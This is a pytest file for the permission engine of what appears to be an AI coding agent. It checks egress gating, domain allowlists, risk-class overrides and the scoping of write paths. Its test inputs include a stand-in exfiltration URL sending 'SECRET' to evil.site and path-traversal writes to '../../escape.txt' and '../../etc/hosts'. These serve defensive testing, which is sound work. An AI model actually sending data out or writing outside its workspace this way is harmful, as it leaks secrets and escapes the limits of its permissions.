"""PR1 — egress split, override tightening, and write-path scoping.

Covers the parts of the golden matrix that need a configured override resolver or exercise
the helpers directly. See `ocw-context/docs/reviewed-auto-mode.md` Part 3.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from coworker.permissions import Mode, PermissionEngine, write_paths
from coworker.risk import RiskClass, classify


# -- egress classification ------------------------------------------------------
def test_web_fetch_is_egress_not_read():
    assert classify("web_fetch") is RiskClass.EGRESS
    # web_search stays a read: it hits a fixed configured provider, not a model-chosen host.
    assert classify("web_search") is RiskClass.READ


@pytest.mark.parametrize(
    "mode,expected_needs_user,expected_allowed",
    [
        (Mode.INTERACTIVE, True, False),  # asks
        (Mode.CUSTOM, True, False),  # asks
        (Mode.PLAN, False, False),  # denied (read-only, egress is not a read)
        (Mode.DISCUSS, False, False),  # denied
        (Mode.BYPASS_APPROVALS, False, True),  # allowed
    ],
)
def test_web_fetch_gated_in_every_mode(tmp_path, mode, expected_needs_user, expected_allowed):
    eng = PermissionEngine(workspace_root=tmp_path, mode=mode)
    d = eng.evaluate("web_fetch", {"url": "https://evil.site/log?d=SECRET"}, None)
    assert d.allowed is expected_allowed
    assert d.needs_user is expected_needs_user


def test_egress_domain_allowlist_subdomain_match(tmp_path):
    eng = PermissionEngine(workspace_root=tmp_path, allowed_domains=["python.org"])
    assert eng.evaluate("web_fetch", {"url": "https://docs.python.org/3"}, None).allowed
    # a look-alike that merely ends with the string must NOT match
    assert not eng.evaluate("web_fetch", {"url": "https://evil-python.org/x"}, None).allowed


def test_egress_session_domain_grant(tmp_path):
    eng = PermissionEngine(workspace_root=tmp_path)
    assert eng.evaluate("web_fetch", {"url": "https://api.github.com/x"}, None).needs_user
    eng.allow_domain_for_session("https://api.github.com/anything")
    assert eng.evaluate("web_fetch", {"url": "https://api.github.com/x"}, None).allowed


# -- override tightening --------------------------------------------------------
def _override(mapping):
    return lambda name: mapping.get(name)


def test_override_cannot_downgrade_builtin_write(tmp_path):
    # A user override marking write_file as a harmless read must be ignored: path scoping
    # and the read-only gate both key off the class, so a downgrade would switch off both.
    ov = _override({"write_file": RiskClass.READ})
    assert classify("write_file", None, ov) is RiskClass.WRITE_LOCAL

    eng = PermissionEngine(workspace_root=tmp_path, mode=Mode.PLAN, risk_overrides=ov)
    d = eng.evaluate("write_file", {"path": "../../escape.txt", "content": "x"}, None)
    assert not d.allowed  # still blocked; the downgrade did nothing


def test_override_can_still_relax_a_plugin_tool(tmp_path):
    # The intended use survives: a non-built-in (MCP) tool defaulting to external can be
    # relaxed to read.
    from types import SimpleNamespace

    ov = _override({"mcp__notion__search": RiskClass.READ})
    meta = SimpleNamespace(requires_approval=True, category="mcp")
    assert classify("mcp__notion__search", meta, ov) is RiskClass.READ


def test_override_may_tighten(tmp_path):
    # Tightening a plugin read up to exec is honoured.
    ov = _override({"mcp__x__run": RiskClass.EXEC})
    assert classify("mcp__x__run", None, ov) is RiskClass.EXEC


# -- write-path extraction / scoping -------------------------------------------
def test_write_paths_simple_tools():
    assert write_paths("write_file", {"path": "a.txt"}) == (["a.txt"], True)
    assert write_paths("replace_in_file", {"path": "b.py"}) == (["b.py"], True)
    # a write tool with no locatable path → not located → caller fails closed
    assert write_paths("write_file", {}) == ([], False)


def test_write_paths_from_patch_blob():
    patch = "*** Begin Patch\n*** Update File: src/app.py\n@@\n-a\n+b\n*** End Patch"
    assert write_paths("apply_patch", {"patch": patch}) == (["src/app.py"], True)
    diff = "--- a/old.py\n+++ b/new.py\n@@\n-a\n+b"
    assert write_paths("apply_unified_diff", {"diff": diff}) == (["new.py"], True)


def test_unknown_write_tool_fails_closed(tmp_path):
    # A tool promoted to write via an override, whose path we can't locate, must not slip
    # through auto mode unscoped — it asks instead.
    ov = _override({"weird_writer": RiskClass.WRITE_LOCAL})
    eng = PermissionEngine(workspace_root=tmp_path, mode=Mode.BYPASS_APPROVALS, risk_overrides=ov)
    d = eng.evaluate("weird_writer", {"blob": "..."}, None)
    assert not d.allowed and d.needs_user


def test_patch_scoping_holds_in_auto_mode(tmp_path):
    eng = PermissionEngine(workspace_root=tmp_path, mode=Mode.BYPASS_APPROVALS)
    escape = "*** Begin Patch\n*** Update File: ../../etc/hosts\n@@\n-a\n+b\n*** End Patch"
    assert not eng.evaluate("apply_patch", {"patch": escape}, None).allowed
    ok = "*** Begin Patch\n*** Update File: src/app.py\n@@\n-a\n+b\n*** End Patch"
    assert eng.evaluate("apply_patch", {"patch": ok}, None).allowed
